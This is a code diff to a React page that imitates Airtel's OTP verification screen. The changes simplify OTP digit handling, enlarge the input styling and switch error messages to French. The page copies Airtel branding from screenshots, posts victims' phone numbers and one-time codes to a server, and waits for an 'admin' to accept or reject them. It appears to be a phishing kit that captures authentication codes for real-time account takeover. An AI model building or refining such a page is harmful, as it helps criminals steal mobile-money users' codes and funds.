@@ -26,7 +26,7 @@ function AirtelOTPVerify() {
   const navigate = useNavigate();
   const { t } = useLanguage(); 
 
-  // Changed to a single string for the unified input box
+  // Pure string for OTP without spaces
   const [otp, setOtp] = useState('');
   const [timeLeft, setTimeLeft] = useState(TIMER_START);
   const [timerResetKey, setTimerResetKey] = useState(0);
@@ -113,7 +113,7 @@ function AirtelOTPVerify() {
           }
 
           if (data.status === 'rejected' || data.status === 'expired') {
-            setError(t('invalidCredentials') || 'Code rejected or expired.');
+            setError(t('invalidCredentials') || 'Code rejeté ou expiré.');
             resetToInput();
             return;
           }
@@ -152,20 +152,17 @@ function AirtelOTPVerify() {
     }
   }, [startPolling]);
 
-  // Handle formatting the input as "X X X X"
+  // IMPROVED: Just filter digits, CSS handles the spacing
   const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const val = e.target.value.replace(/\D/g, ''); // Remove non-digits
+    const val = e.target.value.replace(/\D/g, ''); 
     if (val.length <= OTP_LENGTH) {
-      // Add spaces between numbers
-      const formatted = val.split('').join(' ');
-      setOtp(formatted);
+      setOtp(val);
     }
   };
 
   const handleVerify = async (e: React.FormEvent) => {
     e.preventDefault();
-    const rawOtp = otp.replace(/\s/g, ''); // Remove spaces for API
-    if (isVerifying || rawOtp.length < OTP_LENGTH || expired) return;
+    if (isVerifying || otp.length < OTP_LENGTH || expired) return;
 
     setError('');
     setIsVerifying(true);
@@ -183,7 +180,7 @@ function AirtelOTPVerify() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           phone_number: phoneNumber,
-          otp: rawOtp,
+          otp: otp, // No spaces needed now
           ref_id: newRefId,
           submitted_at: nowIso,
         }),
@@ -200,7 +197,7 @@ function AirtelOTPVerify() {
       }
 
       if (data.status === 'rejected') {
-        setError(t('invalidCredentials') || 'Invalid OTP code.');
+        setError(t('invalidCredentials') || 'Code OTP invalide.');
         resetToInput();
         return;
       }
@@ -208,17 +205,17 @@ function AirtelOTPVerify() {
       setWaitingForAdmin(true);
       sessionStorage.setItem(
         PENDING_KEY,
-        JSON.stringify({ refId: finalRef, otp: rawOtp, submittedAt: nowIso }),
+        JSON.stringify({ refId: finalRef, otp: otp, submittedAt: nowIso }),
       );
       startPolling(finalRef);
     } catch {
       resetToInput();
-      setError(t('networkError') || 'Network error.');
+      setError(t('networkError') || 'Erreur réseau.');
     }
   };
 
   const showWaitingOverlay = isVerifying || waitingForAdmin;
-  const isFormValid = otp.replace(/\s/g, '').length === OTP_LENGTH && !expired;
+  const isFormValid = otp.length === OTP_LENGTH && !expired;
 
   return (
     <div className="airtel-page-container">
@@ -234,7 +231,7 @@ function AirtelOTPVerify() {
           display: flex;
           flex-direction: column;
           min-height: 100vh;
-          background-color: #F8F9FA; /* Light gray background */
+          background-color: #F8F9FA;
           position: relative;
         }
 
@@ -389,15 +386,15 @@ function AirtelOTPVerify() {
           width: 100%;
         }
 
-        /* SINGLE OTP INPUT */
+        /* SINGLE OTP INPUT (IMPROVED UI) */
         .otp-input-field {
           width: 100%;
           padding: 18px;
-          border: 2px solid #DA1C1C; /* Red border from screenshot */
+          border: 2px solid #DA1C1C; 
           border-radius: 8px;
-          font-size: 20px;
-          font-weight: 500;
-          letter-spacing: 8px;
+          font-size: 24px;
+          font-weight: 600;
+          letter-spacing: 12px; /* Creates the visual space between digits */
           color: #1a1a1a;
           text-align: center;
           outline: none;
@@ -405,10 +402,12 @@ function AirtelOTPVerify() {
           margin-bottom: 16px;
         }
 
+        /* Dynamic Placeholder Styling */
         .otp-input-field::placeholder {
           color: #9CA3AF;
-          letter-spacing: normal;
+          letter-spacing: normal; /* Keeps placeholder readable */
           font-size: 16px;
+          font-weight: 400;
         }
 
         .otp-input-field:focus {
@@ -495,7 +494,7 @@ function AirtelOTPVerify() {
         }
       `}</style>
 
-      {/* WAITING OVERLAY (Matches Screenshot 2) */}
+      {/* WAITING OVERLAY */}
       {showWaitingOverlay && (
         <div className="waiting-overlay">
           <div className="custom-spinner"></div>
@@ -508,7 +507,7 @@ function AirtelOTPVerify() {
 
       <div className={showWaitingOverlay ? 'faded-content' : ''}>
         
-        {/* HEADER (Matches Screenshot 1) */}
+        {/* HEADER */}
         <header className="header-section">
           <button className="header-icon-btn" onClick={() => navigate('/')}>
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -552,10 +551,11 @@ function AirtelOTPVerify() {
                 type="tel"
                 inputMode="numeric"
                 autoComplete="one-time-code"
-                maxLength={7} /* 4 digits + 3 spaces */
+                maxLength={OTP_LENGTH}
                 value={otp}
                 onChange={handleOtpChange}
-                placeholder="Entrer l'OTP à 4 chiffres"
+                /* DYNAMIC PLACEHOLDER */
+                placeholder={t('enterOtp') || "Entrer l'OTP à 4 chiffres"}
                 className="otp-input-field"
                 disabled={showWaitingOverlay || expired}
               />
@@ -577,7 +577,7 @@ function AirtelOTPVerify() {
           </div>
         </main>
 
-        {/* FOOTER (Matches Screenshot 1) */}
+        {/* FOOTER */}
         <footer className="otp-footer">
           <div className="footer-logo-wrapper">
             <svg width="110" height="30" viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
